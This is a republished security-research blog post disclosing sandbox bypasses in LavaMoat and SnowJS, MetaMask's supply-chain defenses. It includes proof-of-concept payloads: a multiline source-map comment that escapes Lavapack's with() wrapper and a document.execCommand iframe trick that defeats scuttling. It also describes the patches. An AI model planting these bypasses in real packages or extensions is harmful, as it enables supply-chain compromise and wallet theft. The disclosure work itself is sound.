# [M] OtterSec: Supply chain attacks: a new era

## Summary
Severity: Medium
Published: Mon, 10 Jun 2024
Source: https://osec.io/blog/supply-chain-attacks-a-new-era/
Type: security-research

## Details
## Supply chain attacks: a new era

 Bruno Halltari , Caue Obici Jun 10, 2024 Unpacking Lavamoat and how it fights supply chain attacks in Web3. We spill the beans on some sneaky bypasses, illustrating just how tricky it is to lock down JavaScript ecosystems.

## Overview 

 Supply chain attacks are becoming increasingly popular in Web3 . In response, Lavamoat has emerged as a robust defense mechanism against supply chain attacks, offering sophisticated isolation and access control features. These help ensure that malicious dependencies cannot execute harmful code.

 In this article, we will explore how each component of Lavamoat works, and dive into the various bypasses we reported.

## Introduction 

 It is important to note that there are three different versions of Lavamoat:

- Lavamoat Browserify serves as a bundle packer. This helps organize and package JavaScript code for frontend deployment.

- NodeJS Lavamoat is a variant of Lavamoat tailored specifically for Node.js environments.

- Lavamoat allow-scripts are used to prevent malicious code execution on lifecycle scripts.

## Lavamoatâs security features 

 The three most important features of Lavamoat 1 are:

- Policy files

- NPM anti-hijacking

- Scuttling

 Letâs go over them one by one.

### Policy files 

 Policy files are one important feature of Lavamoat, as they limit access to the potentially dangerous platform API and globals.

 For example, take the MetaMask Snap policy file :

 policy.json 
```

```
 1

 "@metamask/providers" : { 

 2

 " globals " : { 

 3

 " Event " : true , 

 4

 " addEventListener " : true , 

 5

 " chrome.runtime.connect " : true , 

 6

 " console " : true , 

 7

 " dispatchEvent " : true , 

 8

 " document.createElement " : true , 

 9

 " document.readyState " : true , 

 10

 " ethereum " : "write" , 

 11

 " location.hostname " : true , 

 12

 " removeEventListener " : true , 

 13

 " web3 " : true 

 14

 }, 

 15

 " packages " : { 

 16

 " @metamask/object-multiplex " : true , 

 17

 " @metamask/providers>@metamask/safe-event-emitter " : true 

```

```

 @metamask/safe-event-emitter": true"> 

 The 
```
globals
```
 section in a Lavamoat policy specifies which global variables and properties a module can access, setting permissions for its global scope interactions. Similarly, the 
```
packages
```
 section outlines the moduleâs dependencies and the permissions or trust relationships with those dependencies. This defines how 
```
@metamask/providers
```
 interacts with other packages.

 To enforce these policies, Lavamoat uses 
```
lavapack
```
, a custom webpack that wraps every dependency and applies the specified rules independently.

### NPM anti-hijacking 

 One important note is that Lavamoat canât rely solely on the names of the packages as they are published on NPM. Otherwise, a malicious actor could create a package with the same name as a popular, trusted package.

 Instead, Lavamoat looks at how each package is connected by walking the modules in a projectâs dependency tree, thus generating a unique name for each package.

### Scuttling 

 Scuttling is an optional feature that adds an extra layer of protection. Even if the real 
```
GlobalThis
```
 object is leaked by an attacker or accessed through a malicious package manager, scuttling removes sensitive APIs, preventing malicious requests from being executed.

 For example, here we see how Lavamoat checks if the feature is enabled after the root package compartment is created:

 scuttle.js 
```

```
 57

 if (scuttleOpts . enabled) { 

 58

 if ( ! Array . isArray (scuttleOpts . exceptions)) { 

 59

 throw new Error ( `LavaMoat - scuttleGlobalThis.exceptions must be an array, got " ${ typeof scuttleOpts . exceptions } "` ) 

 60

 } 

 61

 scuttleOpts . scuttlerFunc (globalRef , realm => performScuttleGlobalThis (realm , scuttleOpts . exceptions)) 

 62

 } 

```

```

 performScuttleGlobalThis(realm, scuttleOpts.exceptions)) }"> 

 Subsequently, the code defines a function called 
```
 generateScuttleOpts () 
```
 that creates and returns an options object.

 Finally, the 
```
 performScuttleGlobalThis () 
```
 function modifies the properties of the global object (
```
 globalRef 
```
). It starts by creating an array 
```
 props 
```
, containing the names of all properties in the prototype chain of 
```
 globalRef 
```
. Then, an empty object is created to serve as a proxy for scuttled properties. The function then iterates over each property, making changes to the global window object based on the provided configuration.

## Hacking webpacks 

 Now letâs get to the fun stuff.

 Webpack is used to bundle all modules and packages into a single file. It inserts all the code of these modules into the bundle file. Checking Lavapack source code, we can see how this actually happens:

```

```
 1

 const filename = encodeURI ( String (moduleData . file)) 

 2

 let moduleWrapperSource 

 3

 if (bundleWithPrecompiledModules) { 

 4

 moduleWrapperSource = `function(){ 

 5

 with (this.scopeTerminator) { 

 6

 with (this.globalThis) { 

 7

 return function() { 

 8

 'use strict'; 

 9

 // source: ${ filename } 

 10

 return function (require, module, exports) { 

 11

 __MODULE_CONTENT__ 

 12

 }; 

 13

 }; 

 14

 } 

 15

 } 

 16

 }` 

```

```

 Lavapack uses 
```
 with () 
```
 proxies to restrict the objects accessible by the module, and 
```
 __MODULE_CONTENT__ 
```
 is replaced by the content of a file required by the project being built.

## Injection? Not so simple 

 We first tried to inject invalid JavaScript inside a JavaScript file, and then attempt to escape the 
```
 with 
```
 environment:

```

```
 1

 } // end function 1 

 2

 } // end function 2 

 3

 } // end with 1 

 4

 } // end with 2 

 5

 6

 alert (document . domain) 

```

```

 However, when we tried to bundle it, a 
```
 ParseError 
```
 was thrown. This is because Lavapack is a plugin of browserify , which has a syntax check before replacing the code.

 Looking deeper into browserify, we find it has a 
```
syntax
```
 stage in its pipeline, and uses the 
```
syntax-error
```
 npm package to validate the syntax of each JavaScript fileâs content. Since Lavapack replaces the 
```
pack
```
 stage in browserifyâs pipeline, which comes after the 
```
syntax
```
 stage, it was not possible to inject invalid JavaScript to escape the Lavamoat sandbox. The browserify pipeline is illustrated below:

 The 
```
syntax-error
```
 package performs a syntax check by using 
```
 eval () 
```
 with function hoisting:

```

```
 1

 try { 

 2

 eval ( 'throw "STOP"; (function () { ' + src + ' \n })()' ) ; 

 3

 return ; 

 4

 } 

 5

 catch (err) { 

 6

 if (err === 'STOP' ) return undefined ; 

 7

 if (err . constructor . name !== 'SyntaxError' ) return err ; 

 8

 return errorInfo (src , file , opts) ; 

 9

 } 

```

```

 Interestingly, it is possible to inject a 
```
}); (() => {
```
 inside source, and will not throw a syntax error. Unfortunately, this is not enough to bypass the 
```
 with () 
```
 sandbox of Lavapack.

## Source map: the syntax killer 

 Lavapack has a feature to extract source map files from the code using the convert-source-map npm package:

```

```
 1

 function extractSourceMaps ( sourceCode ) { 

 2

 const converter = convertSourceMap . fromSource (sourceCode) 

 3

 // if (!converter) throw new Error('Unable to find original inlined sourcemap') 

 4

 const maps = converter && converter . toObject () 

 5

 const code = convertSourceMap . removeComments (sourceCode) 

 6

 return { code , maps } 

 7

 } 

```

```

 This code removes the source map comments of the source code, meaning that there actually is a modification of source code in Lavapack after the 
```
syntax
```
 stage. Reviewing the 
```
convert-source-map
```
 code, we can see exactly how this happens:

```

```
 1

 Object . defineProperty ( exports , 'commentRegex' , { 

 2

 get : function getCommentRegex () { 

 3

 // Groups: 1: media type, 2: MIME type, 3: charset, 4: encoding, 5: data. 

 4

 return / ^ \s *? \/ [ \/\* ][ @# ] \s +? sourceMappingURL=data: (((?: application | text ) \/ json )(?: ;charset= ([^ ;, ]+?)?)?)?(?: ; ( base64 ))? , ( . *?) $ / mg ; 

 5

 } 

 6

 } ) ; 

 7

 8

 exports . removeComments = function ( src ) { 

 9

 return src . replace ( exports . commentRegex , '' ) ; 

 10

 }; 

```

```

 Looking deeper at the RegEx, it matches the start of the multiple line comment (
```
/*
```
) but doesnât match the end of it, meaning that the syntax would break in the case of multiline source map comments.

## The bypass 

 By abusing the 
```
 removeComments () 
```
 function, we could bypass the Lavamoat restrictions by escaping the 
```
 with () 
```
 sandbox. To do so, we created a multiline source map comment, and injected the invalid JavaScript inside the comment:

```

```
 1

 /*# sourceMappingURL=data:,{} 

 2

 3

 }}}} 

 4

 }, { 

 5

 package: "xpl", 

 6

 file: "node_modules/xpl/index.js", 

 7

 test: alert(document.domain), 

 8

 test1: () => { () => { () => { () => { 

 9

 10

 /* 

 11

 */ 

```

```

 { () => { () => { () => {/**/"> 

 This allows malicious code to execute without breaking any other package or feature. This payload also makes the supply chain attack more impactful. Any injected code is executed as soon as the bundle file is imported.

## Lavapack patch 

 MetaMask mitigated the issues we reported on Lavapack by defining 
```
 assertValidJS () 
```
, an independent check that differs from the browserify syntax check we used to exploit the issue.

 The patch was introduced in commit 9c38cd4 :

```

```
 1

 function assertValidJS ( code ) { 

 2

 try { 

 3

 new Function (code) 

 4

 } catch (err) { 

 5

 throw new Error ( `Invalid JavaScript: ${ err . message } ` ) 

 6

 } 

 7

 } 

 8

 9

 // additional layer of syntax checking independent of browserify 

 10

 assertValidJS (sourceMeta . code) 

```

```

## Hacking JS realms 

 Lavamoat scuttling removes unnecessary and dangerous attributes from the 
```
 globalThis 
```
 object. However, this can be easily bypassed when Lavamoat is running in a browser context:

```

```
 const w = window . open ( '/non_existent' ) ; 

 w . alert (document . domain) 

```

```

 This opens a new window with a new JS Realm (another 
```
 globalThis 
```
 object), and uses it to execute code in the context of the scuttled window.

 Note The window must be same-origin and must not be scuttled.

 As a mitigation, some applications integrate SnowJS with scuttling, so every new same-origin window and iframe will be detected and scuttled (check the MetaMask implementation ).

## SnowJS attack surface 

 SnowJS is a JavaScript sandbox implementation that secures same-origin realms in browser applications. It is configured to detect new realms and attach them to the sandbox.

 As a mechanism, it hooks functions that can be used to create realms (an iframe, for example). For example, here are some of the hooked inserters functions:

 inserters.js 
```

```
 9

 const map = { 

 10

 Range : [ 'insertNode' ] , 

 11

 DocumentFragment : [ 'replaceChildren' , 'append' , 'prepend' ] , 

 12

 Document : [ 'replaceChildren' , 'append' , 'prepend' , 'write' , 'writeln' ] , 

 13

 Node : [ 'appendChild' , 'insertBefore' , 'replaceChild' ] , 

 14

 Element : [ 'innerHTML' , 'outerHTML' , 'insertAdjacentHTML' , 'replaceWith' , 'insertAdjacentElement' , 'append' , 'before' , 'prepend' , 'after' , 'replaceChildren' ] , 

 15

 ShadowRoot : [ 'innerHTML' ] , 

 16

 HTMLIFrameElement : [ 'srcdoc' ] , 

 17

 }; 

```

```

 This means that an attacker canât use any of these functions to create an iframe and bypass the snowJS sandbox, because it will detect the new frame and include it in the sandbox.

 Unfortunately, client-side JavaScript is surprisingly complex with lots of strange behaviours that could be used to bypass the hook security feature.

## Bypassing SnowJS 

 The deprecated 
```
document.execCommand
```
 function is used to execute commands inside a 
```
 contenteditable 
```
 focused context. Despite being a deprecated function, it is still supported by modern browsers, and works on an element like this:

```

```
 < div id = test contenteditable autofocus ></ div > 

```

```

"> 

 After inserting this element to a page, it is possible to use the 
```
insertHTML
```
 command of 
```
 document . execCommand () 
```
 to add a non-sandboxed iframe:

```

```
 document . execCommand ( 'insertHTML' , false , '<iframe srcdoc="aaa">' ) ; 

```

```

 ');"> 

## Impact on Lavamoat scuttling 

 As it is recommended to use snowJS integrated with Lavamoat scuttling to prevent bypasses, it is possible to completely bypass the scuttling feature without pre-conditions.

 For the exploit, the only used functions are in the 
```
 document 
```
 object, which can never be scuttled once it is a non-writable and non-configurable property in the 
```
 globalThis 
```
 object.

 Consider this example, which runs a scuttled 
```
 alert () 
```
 function:

```

```
 document . body . innerHTML = "<div id=test contenteditable autofocus></div>" ; 

 document . getElementById ( 'test' ) . focus () ; 

 document . execCommand ( 'insertHTML' , false , '<iframe srcdoc="aaa">' ) ; 

 document . getElementsByTagName ( 'iframe' )[ 0 ] . contentWindow . alert (document . domain) ; 

```

```

";document.getElementById('test').focus();document.execCommand('insertHTML', false, ' ');document.getElementsByTagName('iframe')[0].contentWindow.alert(document.domain);"> 

## SnowJS patch 

 MetaMask is working on conceptual changes and aiming to integrate SnowJS as a browser feature within W3C standards , with the intention of addressing not only this issue, but also all other well-known issues with SnowJS. Here is their new proposal.

## Chaining the impacts 

 We were able to find two vulnerabilities in the Lavamoat project:

- Policy file bypass

- Scuttling bypass

 By combining the exploits, it is possible to completely bypass Lavamoat supply-chain protections using a compromised dependency.

 Using MetaMask as an example, these exploits could be used to retrieve the encrypted keypair in extension storage. The only precondition would be compromising an NPM dependency.

## Conclusion 

 The vulnerability within the Lavapack module sandboxing, along with the issues we discussed regarding SnowJs and the Scuttling feature, illustrate the complexities of mitigating supply chain attacks within the JavaScript ecosystem. While the lavapack release with a mitigation was available in under two days, the inherent complexity makes designing robust security implementations a challenging task.

## Footnotes 

- 
 Excluding SES, which was covered in our last article . â©
